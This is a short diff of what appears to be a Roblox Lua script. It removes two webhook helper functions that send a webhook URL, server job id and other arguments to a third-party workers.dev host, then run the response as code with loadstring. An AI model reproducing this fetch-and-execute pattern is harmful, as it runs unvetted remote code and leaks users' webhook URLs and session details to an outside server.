@@ -45,11 +45,3 @@ _G.id="the-forge"
 else
 _G.id="not"
 end 
-
-function _G.webhook1(webhook,title,prlc,jobid)
-loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=1&webhook="..webhook.."&title="..title.."&prlc="..prlc.."&jobid="..jobid))()  
-end
-
-function _G.webhook2(webhook,title,name,content)
-loadstring(game:HttpGet("https://webhook-api.nekokawaii.workers.dev/api/?type=2&webhook="..webhook.."&title="..title.."&name="..name.."&content="..content))()  
-end
